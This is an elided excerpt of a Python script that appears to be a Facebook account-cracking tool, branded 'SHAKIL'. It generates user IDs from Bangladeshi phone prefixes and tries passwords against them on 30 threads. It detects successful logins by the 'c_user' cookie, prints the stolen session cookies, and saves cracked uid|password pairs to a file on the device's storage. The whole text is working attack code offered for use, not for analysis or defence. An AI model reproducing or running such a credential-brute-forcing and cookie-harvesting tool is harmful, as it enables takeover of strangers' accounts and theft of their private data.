...
def fuck():
    ...
    os.system('clear')
    print(logo)
    print('\033[1;32m[√] BD CODE : 017 019 016 015 018 013')
    ...
    with ThreadPool(max_workers=30) as yaari:
        ...
        print(logo1)
        tl = str(len(user))
        print('\033[0;97m [+] Choice Code: '+code)
        print('\033[1;97m [+] Crack Process Has Started')
...
def mumit2(uid,pwx,tl):
    ...
    try:
        for ps in pwx:
            ...
            sys.stdout.write('\r\033[1;92m[SHAKIL]--[%s/%s]--[OK-%s]~[CP-%s] \r'%(loop,tl,len(oks),len(cps))),
            sys.stdout.flush()
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[7:22]
                print(f"\033[1;92m[SHAKIL-OK] {uid}|{ps} \nCookie : {coki}")
                open('/sdcard/SHAKIL/OK.txt', 'a').write( uid+' | '+ps+'\n')
                oks.append(uid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[82:97]
                print(f"\033[1;94m[SHAKIL-CP] {cid}|{ps}")
